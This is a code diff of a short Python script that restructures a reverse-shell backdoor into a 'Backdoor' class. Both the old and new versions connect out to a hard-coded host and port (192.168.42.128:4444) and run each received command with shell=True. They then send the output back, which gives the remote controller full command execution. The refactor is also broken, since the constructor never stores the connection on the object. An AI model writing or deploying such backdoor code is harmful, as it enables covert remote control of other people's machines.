@@ -1,17 +1,20 @@
 import socket
 import subprocess
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip, port):
+        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connection.connect((ip, port))        
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("192.168.42.128", 4444))
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
 
-connection.send(("\n[+] Connection established.\n").encode())
-
-while True:
-    command = connection.recv(1024)
-    command_result = execute_system_command(command.decode())
-    connection.send(command_result)
-
-connection.close()
+    def run(self):
+        while True:
+            command = self.connection.recv(1024)
+            command_result = self.execute_system_command(command.decode())
+            self.connection.send(command_result)
+        connection.close()
+        
+my_backdoor = Backdoor("192.168.42.128", 4444)
+my_backdoor.run()
